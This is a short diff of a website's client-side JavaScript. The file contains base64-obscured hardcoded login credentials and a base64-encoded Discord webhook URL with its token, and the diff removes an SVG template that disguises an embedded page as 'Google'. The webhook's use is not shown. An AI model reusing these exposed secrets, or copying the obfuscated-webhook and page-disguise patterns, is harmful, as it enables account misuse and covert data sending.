@@ -18,7 +18,6 @@ const p = [
     { username: "Tml0cml4", password: "RGFkZHlOaXRyaXg2OQ==" }
 ];
 const q = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQwMDE3NjUwMDc3ODQ2NzQ4OS9FTlhLTmE4TGZfYXN4bVR3VFlIbkdiT05PRWRva2hQZXVfeUE1UU9oQ2ZlaUpPbzBCbXkwWVRZNHB1UEt3TnlSbFZpMg==";
-const r = `<?xml version="1.0" encoding="utf-8"?><svg xmlns="http://www.w3.org/2000/svg" style="width:100vw !important; height:100vh !important;"><title>Google</title><foreignObject x="0" y="0" style="width:100vw !important; height:100vh !important;"><embed xmlns="http://www.w3.org/1999/xhtml" src="${url}" type="text/plain" style="height:100vh !important; width:100vw !important;" /></foreignObject></svg>`;
 const key = 5;
 console.log('%cWelcome To The Console, If You Do Not Know What You Are Doing, Close It, If You Do I Would Be Happy To Let You Develop The Website With Me infinitecodehs@gmail.com', 'color: purple; font-size: 24px; font-weight: bold;');
 console.log('%cC', `
